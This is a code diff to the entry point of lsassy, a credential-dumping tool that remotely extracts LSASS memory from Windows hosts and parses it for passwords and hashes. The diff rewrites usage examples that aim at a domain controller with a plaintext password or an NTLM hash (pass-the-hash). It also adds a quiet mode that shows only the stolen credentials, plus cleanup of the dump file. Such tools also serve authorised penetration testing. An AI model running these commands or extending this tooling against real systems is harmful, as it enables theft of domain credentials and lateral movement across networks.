@@ -20,11 +20,11 @@ def run():
     import argparse
 
     examples = '''examples:
-  lsassy ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
-  lsassy localuser@desktop01.adsec.local:/C$/Windows/Temp/lsass.dmp
-  lsassy -j ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
-  lsassy -g ADSEC.LOCAL/pixis:p4ssw0rd@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
-  lsassy --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local:/ADMIN$/lsass.dmp'''
+  lsassy -p C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+  lsassy -j -q -p C$/Windows/Temp/lsass.dmp localuser@desktop01.adsec.local
+  lsassy --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local
+  
+  lsassy -d adsec.local/pixis:p4ssw0rd@dc01.adsec.local'''
 
     parser = argparse.ArgumentParser(
         prog="lsassy",
@@ -42,6 +42,7 @@ def run():
     group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
     parser.add_argument('-r', '--raw', action='store_true', help='Raw results without filtering')
     parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
     parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
     parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>')
 
@@ -50,18 +51,28 @@ def run():
         sys.exit(0)
 
     args = parser.parse_args()
-    conn = ImpacketConnection.from_args(args, args.debug)
+    conn = ImpacketConnection.from_args(args, args.debug, args.quiet)
     file_path = args.path
+
+    dumper = None
     if not args.path:
-        dumper = Dumper(conn, args, args.debug)
+        dumper = Dumper(conn, args, args.debug, args.quiet)
         file_path = dumper.dump()
+        if not file_path:
+            exit()
 
     ifile = ImpacketFile()
     ifile.open(conn, file_path)
     dumpfile = pypykatz.parse_minidump_external(ifile)
+    ifile.close()
     parser = Parser(dumpfile)
     parser.output(args)
-    
+
+    if dumper is not None:
+        dumper.clean()
+    conn.close()
+    exit()
+
 
 if __name__ == '__main__':
     run()
